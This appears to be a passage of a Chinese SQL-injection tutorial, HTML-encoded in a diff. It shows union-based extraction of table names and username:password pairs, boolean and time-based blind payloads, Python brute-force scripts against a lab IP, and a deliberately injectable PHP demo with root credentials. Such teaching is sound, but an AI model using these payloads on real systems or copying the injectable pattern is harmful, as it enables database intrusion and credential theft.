+<p>&#x8FD9;&#x91CC;n&#x4E3A;3&#x65F6;&#x5C31;&#x62A5;&#x9519;&#x4E86;&#xFF0C;&#x8BF4;&#x660E;&#x8868;&#x4E2D;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x4E3A;2</p>
+</li>
+<li><p>&#x5224;&#x65AD;&#x56DE;&#x663E;&#x7684;&#x5B57;&#x6BB5;</p>
+<blockquote>
+<p>id = 0 union select 1,2;</p>
+</blockquote>
+<p>&#x8FD9;&#x91CC;&#x901A;&#x8FC7;id=0&#x8BA9;&#x524D;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x4E0D;&#x4F1A;&#x6709;&#x7ED3;&#x679C;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;union&#x6765;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x3002;</p>
+<p><img src="../images/image-20200515104657101.png" alt="image-20200515104657101"></p>
+<p>&#x8FD9;&#x91CC;&#x663E;&#x793A;&#x7684;&#x4F4D;&#x5B50;&#x662F;2&#x53F7;&#x4F4D;&#xFF0C;&#x800C;&#x4E14;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x4F1A;&#x663E;&#x793A;&#x3002;</p>
+</li>
+<li><p>&#x7206;&#x6570;&#x636E;&#x5E93;&#x540D;</p>
+<blockquote>
+<p>id = 0 union select 1,database();</p>
+</blockquote>
+<p><img src="../images/image-20200515105056769.png" alt="image-20200515105056769"></p>
+<p>&#x8FD9;&#x91CC;&#x7206;&#x51FA;&#x6765;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;&#x4E3A;vul</p>
+</li>
+<li><p>&#x7206;&#x8868;&#x540D;</p>
+<p>&#x5728;information_schema&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;&#x8BE5;&#x6570;&#x636E;&#x5E93;&#x6240;&#x62E5;&#x6709;&#x7684;&#x8868;</p>
+<blockquote>
+<p>id = 0 union select 1, group_concat(table_name) from information_schema.tables where table_schema = database();</p>
+</blockquote>
+<p><img src="../images/image-20200515145441889.png" alt="image-20200515145441889"></p>
+<p>&#x8FD9;&#x91CC;&#x663E;&#x793A;&#x51FA;&#x4E24;&#x4E2A;&#x8868;&#xFF1A;users&#x548C;test</p>
+</li>
+<li><p>&#x7206;&#x5217;&#x540D;</p>
+<p>&#x6839;&#x636E;&#x7206;&#x51FA;&#x6765;&#x7684;&#x8868;&#x540D;&#xFF0C;&#x5728;information_schema.columns&#x4E2D;&#x67E5;&#x8BE2;&#x8868;&#x4E2D;&#x7684;&#x5B57;&#x6BB5;</p>
+<blockquote>
+<p>id = 0 union select 1, group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;;</p>
+</blockquote>
+<p><img src="../images/image-20200515150137000.png" alt="image-20200515150137000"></p>
+<p>&#x56E0;&#x4E3A;users&#x8868;&#x539F;&#x672C;&#x5728;MYSQL&#x4E2D;&#x5C31;&#x5B58;&#x5728;&#x7684;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x7528;&#x6237;&#x7684;&#x540D;&#x79F0;&#xFF0C;&#x548C;&#x8FDE;&#x63A5;&#x6570;&#x76EE;&#xFF0C;&#x800C;&#x6211;&#x521B;&#x5EFA;&#x7684;users&#x8868;&#x5305;&#x542B;&#x7684;&#x5B57;&#x6BB5;&#x6709;: id,username,userpasswd&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5DF2;&#x7ECF;&#x88AB;&#x7206;&#x51FA;&#x6765;&#x4E86;</p>
+</li>
+<li><p>&#x7206;&#x5217;&#x7684;&#x5185;&#x5BB9;</p>
+<blockquote>
+<p>id=0 union select 1,group_concat(username,0x3a,userpasswd) from users</p>
+</blockquote>
+<p><img src="../images/image-20200515150805625.png" alt="image-20200515150805625"></p>
+</li>
+</ol>
+<h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x7C7B;">&#x6F0F;&#x6D1E;&#x5206;&#x7C7B;</h3>
+<h4 id="type&#x6CE8;&#x5165;&#x5229;&#x7528;">type&#x6CE8;&#x5165;&#x5229;&#x7528;</h4>
+<p>&#x6309;&#x7167;&#x6CE8;&#x5165;&#x70B9;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x6765;&#x5BF9;SQL&#x6CE8;&#x5165;&#x8FDB;&#x884C;&#x5206;&#x7C7B;&#xFF0C;&#x4E00;&#x5171;&#x6709;&#x4E09;&#x79CD;&#x7C7B;&#x578B;&#xFF1A;</p>
+<ol>
+<li><p>&#x6574;&#x578B;&#x6CE8;&#x5165;</p>
+<p>SQL&#x539F;&#x578B;&#xFF1A;SELECT * FROM news WHERE id=1;</p>
+<p>&#x5176;&#x4E2D;&#x53EF;&#x63A7;&#x53C2;&#x6570;id&#x662F;&#x6574;&#x6570;&#x7C7B;&#x578B;&#xFF0C;&#x5728;web&#x7AEF;&#x663E;&#x793A;&#x5927;&#x6982;&#x5982;&#x4E0B;&#xFF1A;</p>
+<blockquote>
+<p><a href="http://www.xxx.com/index.php?id=1" target="_blank">http://www.xxx.com/index.php?id=1</a></p>
+</blockquote>
+<p>&#x8FD9;&#x7C7B;&#x578B;&#x7684;&#x6CE8;&#x5165;&#x4E00;&#x822C;&#x6309;&#x5E38;&#x89C4;&#x6CE8;&#x5165;&#x6D41;&#x7A0B;&#x6765;&#x5C31;&#x884C;&#x4E86;&#x3002;</p>
+</li>
+<li><p>&#x5B57;&#x7B26;&#x578B;&#x6CE8;&#x5165;</p>
+<p>SQL&#x539F;&#x578B;&#xFF1A;SELECT * FROM news WHERE author=&apos;admin&apos;;</p>
+<p>&#x5176;&#x4E2D;&#x53EF;&#x63A7;&#x53C2;&#x6570;author&#x662F;&#x5B57;&#x7B26;&#x7C7B;&#x578B;&#xFF0C;&#x5728;web&#x7AEF;&#x7684;&#x663E;&#x793A;&#x5927;&#x6982;&#x5982;&#x4E0B;&#xFF1A;</p>
+<blockquote>
+<p><a href="http://www.xxx.com/index.php?name=admin" target="_blank">http://www.xxx.com/index.php?name=admin</a></p>
+</blockquote>
+<p>&#x8FD9;&#x7C7B;&#x578B;&#x7684;&#x6CE8;&#x5165;&#x4E00;&#x822C;&#x90FD;&#x8981;&#x5148;&#x95ED;&#x5408;&#x5F15;&#x53F7;&#xFF0C;&#x5355;&#x5F15;&#x53F7;&#x5C31;&#x95ED;&#x5408;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x53CC;&#x5F15;&#x53F7;&#x5C31;&#x95ED;&#x5408;&#x53CC;&#x5F15;&#x53F7;&#xFF0C;&#x540C;&#x65F6;&#x5728;&#x6784;&#x9020;&#x7684;SQL&#x8BED;&#x53E5;&#x540E;&#x52A0;&#x6CE8;&#x91CA;&#x7B26;&#x5C06;&#x540E;&#x9762;&#x7684;&#x5F15;&#x53F7;&#x6CE8;&#x91CA;&#x6389;&#x3002;</p>
+</li>
+<li><p>&#x641C;&#x7D22;&#x578B;&#x6CE8;&#x5165;</p>
+<p>SQL&#x539F;&#x578B;&#xFF1A;SELECT * FROM news WHERE title like &apos;%xxx%&apos;;</p>
+<p>&#x5176;&#x4E2D;&#x53EF;&#x63A7;&#x53C2;&#x6570;&#x662F;xxx&#xFF0C;&#x8FD9;&#x4E2A;SQL&#x8BED;&#x53E5;&#x4F1A;&#x5BFB;&#x627E;title&#x4E2D;&#x5305;&#x542B;xxx&#x7684;&#x6570;&#x636E;&#x3002;</p>
+<p>&#x5982;&#x679C;&#x7528;&#x6237;&#x8F93;&#x5165;&#xFF1A;news&apos; and 1=1 and &apos;%=</p>
+<p>SQL&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x5C31;&#x4F1A;&#x53D8;&#x6210;:</p>
+<blockquote>
+<p> SELECT * FROM news WHERE title like &apos;%news&apos; and 1=1 and&apos;%=%&apos;;</p>
+</blockquote>
+<p>&#x6240;&#x4EE5;&#x5B58;&#x5728;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#xFF0C;&#x5229;&#x7528;&#x65F6;&#x8BB0;&#x5F97;&#x95ED;&#x5408;&#x5F15;&#x53F7;&#x548C;&#x767E;&#x5206;&#x53F7;&#x3002;</p>
+</li>
+</ol>
+<h4 id="&#x6309;&#x7167;&#x6548;&#x679C;&#x6CE8;&#x5165;&#x5229;&#x7528;">&#x6309;&#x7167;&#x6548;&#x679C;&#x6CE8;&#x5165;&#x5229;&#x7528;</h4>
+<h5 id="&#x8054;&#x5408;&#x6CE8;&#x5165;">&#x8054;&#x5408;&#x6CE8;&#x5165;</h5>
+<p>&#x8054;&#x5408;&#x6CE8;&#x5165;&#x5C31;&#x662F;&#x5229;&#x7528;union&#x6765;&#x8FDB;&#x884C;&#x6CE8;&#x5165;&#x3002;</p>
+<p>union&#x7528;&#x4E8E;&#x5408;&#x5E76;&#x4E24;&#x4E2A;select&#x7684;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x5B83;&#x5FC5;&#x987B;&#x6EE1;&#x8DB3;&#x51E0;&#x4E2A;&#x6761;&#x4EF6;&#x3002;</p>
+<ul>
+<li>union&#x5FC5;&#x987B;&#x7531;&#x4E24;&#x6761;&#x6216;&#x8005;&#x4E24;&#x6761;&#x4EE5;&#x4E0A;&#x7684;select&#x8BED;&#x53E5;&#x7EC4;&#x6210;&#xFF0C;&#x8BED;&#x53E5;&#x4E4B;&#x95F4;&#x4F7F;&#x7528;union&#x94FE;&#x63A5;</li>
+<li>union&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;select&#x8BED;&#x53E5;&#x5FC5;&#x987B;&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x5217;&#x3001;&#x8868;&#x8FBE;&#x5F0F;&#x6216;&#x8005;&#x805A;&#x5408;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x51FA;&#x73B0;&#x987A;&#x5E8F;&#x53EF;&#x4EE5;&#x4E0D;&#x4E00;&#x81F4;</li>
+<li>&#x5217;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x517C;&#x5BB9;&#xFF0C;&#x517C;&#x5BB9;&#x7684;&#x542B;&#x4E49;&#x662F;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x9690;&#x542B;&#x7684;&#x8F6C;&#x6362;&#x5B83;&#x4EEC;&#x7684;&#x7C7B;&#x578B;<ul>
+<li>NULL&#x53EF;&#x4EE5;&#x8F6C;&#x6362;&#x4E3A;&#x6BCF;&#x79CD;&#x5E38;&#x7528;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5728;&#x4E0D;&#x786E;&#x5B9A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x65F6;&#x53EF;&#x4EE5;&#x65F6;&#x7528;NULL&#x6765;&#x63A2;&#x6D4B;&#x5B57;&#x6BB5;&#x6570;&#x91CF;</li>
+</ul>
+</li>
+</ul>
+<p>&#x8FD9;&#x7C7B;&#x6CE8;&#x5165;&#x4E00;&#x822C;&#x8981;&#x5148;&#x5229;&#x7528;order by&#x8BED;&#x53E5;&#x7206;&#x51FA;&#x5217;&#x7684;&#x6570;&#x91CF;&#x3002;</p>
+<h5 id="&#x57FA;&#x4E8E;&#x5E03;&#x5C14;&#x7684;&#x76F2;&#x6CE8;">&#x57FA;&#x4E8E;&#x5E03;&#x5C14;&#x7684;&#x76F2;&#x6CE8;</h5>
+<p>SQL&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x4E0D;&#x4F1A;&#x56DE;&#x663E;&#x5230;&#x9875;&#x9762;&#x4E0A;&#xFF0C;&#x9875;&#x9762;&#x56DE;&#x663E;&#x53EA;&#x80FD;&#x5224;&#x65AD;true or false&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x6784;&#x9020;SQL&#x5224;&#x65AD;&#x8BED;&#x53E5;&#xFF0C;&#x901A;&#x8FC7;&#x9875;&#x9762;&#x7684;&#x56DE;&#x663E;&#x6765;&#x63A8;&#x6D4B;&#x90A3;&#x4E9B;SQL&#x5224;&#x65AD;&#x6761;&#x4EF6;&#x6210;&#x7ACB;&#xFF0C;&#x4EE5;&#x6B64;&#x6765;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>
+<p>&#x7528;&#x5230;&#x7684;MYSQL&#x51FD;&#x6570;:</p>
+<ul>
+<li>length() &#xFF1A;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;</li>
+<li>substr(str,m,n) &#xFF1A;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;str&#x4ECE;&#x7B2C;m&#x4F4D;&#x5F00;&#x59CB;&#x7684;n&#x4E2A;&#x5B57;&#x7B26;</li>
+<li>ascii() &#xFF1A; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x7684;ascii&#x7801;</li>
+</ul>
+<p>demo: boolean.php</p>
+<pre><code class="lang-php">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=gbk&quot;</span> /&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method=<span class="hljs-string">&quot;GET&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;
+    ID&#xFF1A;
+    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;id&quot;</span> /&gt;
+    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;&#x67E5;&#x8BE2;&quot;</span> /&gt;
+&lt;/form&gt;
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">// &#x6539;&#x6210;&#x81EA;&#x5DF1;&#x673A;&#x5B50;&#x4E0A;&#x7684;&#x914D;&#x7F6E;&#xFF1A;</span>
+$host = <span class="hljs-string">&apos;127.0.0.1:3306&apos;</span>;
+$un = <span class="hljs-string">&apos;root&apos;</span>;
+$pw = <span class="hljs-string">&apos;123456&apos;</span>;
+$db = <span class="hljs-string">&apos;vul&apos;</span>;
+
+$id = @$_GET[<span class="hljs-string">&apos;id&apos;</span>];
+<span class="hljs-keyword">if</span>($id == <span class="hljs-string">&apos;&apos;</span>)
+    <span class="hljs-keyword">return</span>;
+$conn = @mysqli_connect($host, $un, $pw);
+<span class="hljs-keyword">if</span>(!$conn)
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x9519;&#x8BEF;&#xFF1A;&apos;</span> . mysqli_error($conn));
+mysqli_select_db($conn, $db);
+$sql = <span class="hljs-string">&quot;select id, username from user_info where id=$id&quot;</span>;
+$res = mysqli_query($conn, $sql);
+<span class="hljs-keyword">if</span>(!$res)
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;&#x6570;&#x636E;&#x5E93;&#x9519;&#x8BEF;&#xFF1A;&apos;</span>. mysqli_error($conn));
+$num = mysqli_num_rows($res);
+$row = mysqli_fetch_row($res);
+<span class="hljs-keyword">if</span>(!$row)
+{ 
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;you are not in!&lt;/p&gt;&quot;</span>;
+}
+<span class="hljs-keyword">else</span>
+{
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your are in!&lt;/p&gt;&quot;</span>;
+}
+mysqli_close($conn);
+<span class="hljs-meta">?&gt;</span>
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li><p>&#x5224;&#x65AD;&#x6570;&#x636E;&#x5E93;&#x540D;&#x957F;&#x5EA6;</p>
+<p>payload: ?id=0 or length(database()) &gt;1 </p>
+<p>&#x8FD9;&#x91CC;id=0&#x662F;&#x4E3A;&#x4E86;&#x8BA9;&#x524D;&#x9762;&#x7684;select&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x4E3A;&#x7A7A;&#xFF0C;&#x901A;&#x8FC7;&#x66FF;&#x6362;&gt;&#x540E;&#x7684;&#x6570;&#x5B57;&#x4E0D;&#x65AD;&#x8FDB;&#x884C;&#x5C1D;&#x8BD5;</p>
+<p>&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5728;&#x6570;&#x5B57;&#x53D8;&#x6210;3&#x65F6;&#xFF0C;&#x9875;&#x9762;&#x56DE;&#x663E;&#x53D8;&#x6210;&#x4E86;&quot;you are not in&quot;&#xFF0C;&#x8BF4;&#x660E;&#x6570;&#x636E;&#x5E93;&#x540D;&#x957F;&#x5EA6;&#x4E3A;3</p>
+<p><img src="../images/image-20200517104724461.png" alt="image-20200517104724461"></p>
+<p>&#x811A;&#x672C;&#xFF1A;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_len</span><span class="hljs-params">(sqls)</span>:</span>
+    url = <span class="hljs-string">&quot;http://192.168.45.139/select1.php&quot;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+        s = sqls.format(str(i))
+        parm = {<span class="hljs-string">&quot;id&quot;</span>: s}
+        r = requests.get(url, parm)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;you are not in!&quot;</span> <span class="hljs-keyword">in</span> r.text:
+            print(<span class="hljs-string">&quot;len is&quot;</span>,str(i))
+            <span class="hljs-keyword">return</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">continue</span>
+
+brute_len(<span class="hljs-string">&quot;0 or length(database())&gt;{0}&quot;</span>)
+</code></pre>
+</li>
+</ul>
+<ul>
+<li><p>&#x7206;&#x7834;&#x6570;&#x636E;&#x5E93;&#x540D;</p>
+<p>&#x8FD9;&#x91CC;&#x4ECB;&#x7ECD;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x904D;&#x5386;&#x6CD5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x4E8C;&#x5206;&#x6CD5;</p>
+<ul>
+<li><p>&#x904D;&#x5386;&#x6CD5;</p>
+<p>&#x901A;&#x8FC7;&#x904D;&#x5386;&#x53EF;&#x89C6;&#x5B57;&#x7B26;&#x6765;&#x731C;&#x89E3;&#x5185;&#x5BB9;</p>
+<p>&#x811A;&#x672C;&#xFF1A;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">brute_con</span><span class="hljs-params">(sqls,len)</span>:</span>
+    url = <span class="hljs-string">&quot;http://192.168.45.139/select1.php&quot;</span>
+    <span class="hljs-comment">#</span>
+    chars = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&apos;#$%&amp;()*+,-./:;&lt;=&gt;?@[]^_{|}~&quot;</span>
+    name = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,len+<span class="hljs-number">1</span>):
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chars:
+            s = sqls.format(str(i),c)
+            parm = {<span class="hljs-string">&quot;id&quot;</span>:s}
+            r = requests.get(url,parm)
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your are in!&quot;</span> <span class="hljs-keyword">in</span> r.text:
+                name += c
+                print(c,end=<span class="hljs-string">&quot;&quot;</span>)
+                <span class="hljs-keyword">break</span>
+            <span class="hljs-keyword">else</span>:
+                <span class="hljs-keyword">continue</span>
+    <span class="hljs-keyword">return</span> name
+brute_con(<span class="hljs-string">&quot;0  or substr(database(),{0},1) = &apos;{1}&apos;&quot;</span>,<span class="hljs-number">3</span>)
+</code></pre>
+</li>
+<li><p>&#x4E8C;&#x5206;&#x6CD5;</p>
+<p>&#x53EF;&#x89C6;&#x5B57;&#x7B26;&#x7684;ascii&#x503C;&#x8303;&#x56F4;&#x5927;&#x6982;&#x5728;0x20~0x7f&#x4E4B;&#x95F4;&#x3002;</p>
+<p>&#x8FD9;&#x91CC;&#x901A;&#x8FC7;&#x5C06;&#x5B57;&#x7B26;&#x8F6C;&#x4E3A;ascii&#x7801;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#xFF0C;&#x5229;&#x7528;&#x4E8C;&#x5206;&#x641C;&#x7D22;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x5FEB;&#x5C06;&#x5185;&#x5BB9;&#x7206;&#x7834;&#x51FA;&#x6765;</p>
+<p>&#x4F8B;&#x5982;&#xFF1A;0 or ascii(substr(database(),1,1)) &lt; 0x7f</p>
+<p>&#x601D;&#x8DEF;&#xFF1A;</p>
+<ol>
+<li>&#x9996;&#x5148;&#x53D6;mid&#x503C;&#xFF0C;&#x6784;&#x9020;SQL&#x5224;&#x65AD;&#x8BED;&#x53E5;&#xFF0C;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x4E3A;true&#xFF0C;&#x5219;&#x7ED3;&#x675F;&#x641C;&#x7D22;</li>
+<li>&#x5982;&#x679C;&#x76EE;&#x6807;&#x5143;&#x7D20;ascii&#x503C;&#x5C0F;&#x4E8E;mid&#xFF0C;&#x5219;&#x4EE4;right=mid&#xFF0C;&#x7136;&#x540E;&#x5728;&#x65B0;&#x7684;&#x533A;&#x95F4;&#x91CD;&#x590D;1</li>
+<li>&#x5982;&#x679C;&#x76EE;&#x6807;&#x5143;&#x7D20;ascii&#x503C;&#x5927;&#x4E8E;mid&#xFF0C;&#x5219;&#x4EE4;left=mid&#xFF0C;&#x7136;&#x540E;&#x5728;&#x65B0;&#x7684;&#x533A;&#x95F4;&#x91CD;&#x590D;1</li>
+</ol>
+<p>&#x811A;&#x672C;:</p>
+<p>```python
+def binary(sql,length):</p>
+<pre><code>url = &quot;http://192.168.45.139/select1.php&quot;
+for i in range(1,length+1):
+    left = 0x1f
+    right = 0x7f
+    while 1:
+        mid = left+(right-left)//2
+        if(mid == left):
+            print(chr(mid),end=&quot;&quot;)
+            break
+        sqls = sql.format(str(i) ,mid)
+        #print(sqls)
+        param = {&quot;id&quot;:sqls}
+        r = requests.get(url,param)
+        if &quot;Your are in!&quot; in r.text:
+            right = mid
+        else:
+            left = mid
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<pre><code>binary( &quot;0 or ascii(substr(database(),{0},1)) &lt; {1}&quot;,3)
+```
+</code></pre><ul>
+<li><p>&#x7206;&#x7834;&#x8868;&#x540D;&#x957F;&#x5EA6;</p>
+<p>&#x8FD9;&#x91CC;&#x7528;&#x4E4B;&#x524D;&#x7684;&#x90A3;&#x4E2A;&#x7206;&#x7834;&#x957F;&#x5EA6;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x66FF;&#x6362;payload&#x8BED;&#x53E5;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
+<p>payload:</p>
+<blockquote>
+<p>&quot;0 or length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) &gt; {0}&quot;</p>
+<p>&quot;0 or length((select table_name from information_schema.tables where table_schema = database() limit 1,1)) &gt; {0}&quot;</p>
+</blockquote>
+<p>&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x6211;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6709;&#x4E24;&#x4E2A;&#x8868;&#xFF0C;&#x6240;&#x4EE5;&#x7528;limit&#x6765;&#x9009;&#x62E9;&#x4E0D;&#x540C;&#x7684;&#x8868;&#x540D;</p>
+<p><img src="../images/image-20200517115620426.png" alt="image-20200517115620426"></p>
+<p> &#x4E24;&#x4E2A;&#x8868;&#x957F;&#x5EA6;&#x5206;&#x522B;&#x4E3A;4&#x548C;9</p>
+</li>
+<li><p>&#x7206;&#x7834;&#x8868;&#x540D;</p>
+<p>&#x8FD9;&#x91CC;&#x7528;&#x904D;&#x5386;&#x6CD5;&#x6216;&#x8005;&#x4E8C;&#x5206;&#x6CD5;&#x90FD;&#x53EF;&#x4EE5;&#xFF0C;&#x6211;&#x90FD;&#x8BD5;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x5199;&#x904D;&#x5386;&#x6CD5;&#x7684;&#x3002;</p>
+<p>payload&#xFF1A;</p>
+<blockquote>
+<p>&quot;0 or substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),{0},1) = &apos;{1}&apos;&quot;</p>
+<p>&quot;0 or substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),{0},1) = &apos;{1}&apos;&quot;</p>
+</blockquote>
+<p><img src="../images/image-20200517120057940.png" alt="image-20200517120057940"></p>
+</li>
+<li><p>&#x7206;&#x7834;&#x8868;&#x4E2D;&#x5217;&#x540D;&#x7684;&#x957F;&#x5EA6;</p>
+<p>payload:</p>
+<blockquote>
+<p>0 or length((select group_concat(column_name) from information_schema.columns where table_name  = &apos;user_info&apos; limit {0},1)) &gt; {1}</p>
+</blockquote>
+<p><img src="../images/image-20200517123041261.png" alt="image-20200517123041261"></p>
+</li>
+<li><p>&#x7206;&#x7834;&#x5217;&#x540D;</p>
+<p>payload:</p>
+<blockquote>
+<p>&quot;0 or substr((select group_concat(column_name) from information_schema.columns where table_name = &apos;user_info&apos; limit 0,1),{0},1) = &apos;{1}&apos;&quot;</p>
+</blockquote>
+<p><img src="../images/image-20200517123211804.png" alt="image-20200517123211804"></p>
+</li>
+<li><p>&#x7206;&#x7834;&#x5217;&#x7684;&#x5185;&#x5BB9;</p>
+<p>&#x5148;&#x7206;&#x7834;&#x5185;&#x5BB9;&#x7684;&#x957F;&#x5EA6;</p>
+<p>payload&#xFF1A;</p>
+<blockquote>
+<p>&quot;0 or length((select group_concat(id,username,0x3a,userpasswd) from user_info)) &gt; {0}&quot;</p>
+</blockquote>
+<p>&#x7136;&#x540E;&#x518D;&#x7206;&#x7834;&#x5185;&#x5BB9;&#xFF1A;</p>
+<p>payload:</p>
+<blockquote>
+<p>&quot;0 or substr((select group_concat(id,username,0x3a,userpasswd) from user_info),{0},1) = &apos;{1}&apos;&quot;</p>
+</blockquote>
+<p><img src="../images/image-20200517123735954.png" alt="image-20200517123735954"></p>
+</li>
+</ul>
+<h5 id="&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x7684;&#x76F2;&#x6CE8;">&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x7684;&#x76F2;&#x6CE8;</h5>
+<p>SQL&#x67E5;&#x8BE2;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x4F1A;&#x56DE;&#x663E;&#x9875;&#x9762;&#x4E0A;&#xFF0C;&#x540C;&#x65F6;&#x9875;&#x9762;&#x4E5F;&#x4E0D;&#x80FD;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#x662F;&#x5426;&#x6267;&#x884C;&#x6210;&#x529F;&#x3002;</p>
+<p>&#x5177;&#x4F53;&#x539F;&#x7406;&#xFF1A;&#x5F53;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8BED;&#x53E5;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x662F;0&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E00;&#x7279;&#x6027;&#xFF0C;&#x901A;&#x8FC7;&#x65F6;&#x95F4;&#x5EF6;&#x65F6;&#x6765;&#x5224;&#x65AD;&#x67E5;&#x8BE2;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x4E00;&#x822C;&#x5229;&#x7528;sleep&#x51FD;&#x6570;&#x6216;&#x8005;benchmark&#x51FD;&#x6570;&#x6765;&#x8FDB;&#x884C;&#x5EF6;&#x65F6;&#x3002;</p>
+<p>&#x4F8B;&#x5982;&#xFF1A;</p>
+<blockquote>
+<p>select * from user_info where id = $id and if(length(database())&gt;3,sleep(5),1)</p>
+</blockquote>
+<p>&#x4E0A;&#x9762;&#x7684;sql&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x5F53;&#x6570;&#x636E;&#x5E93;&#x540D;&#x5927;&#x4E8E;3&#x65F6;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x5EF6;&#x65F6;5&#x79D2;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x53CD;&#x5219;if&#x4F1A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;1&#xFF0C;&#x5E76;&#x4E14;&#x4E0E;&#x524D;&#x9762;&#x7684;&#x903B;&#x8F91;&#x4E0E;&#x62FC;&#x63A5;&#x3002;&#x901A;&#x5E38;&#x54CD;&#x5E94;&#x7684;&#x65F6;&#x95F4;&#x5E94;&#x8BE5;&#x518D;0-1s&#x4E4B;&#x5185;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x5206;&#x8FA8;&#x51FA;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
+<p>demo:select2.php</p>
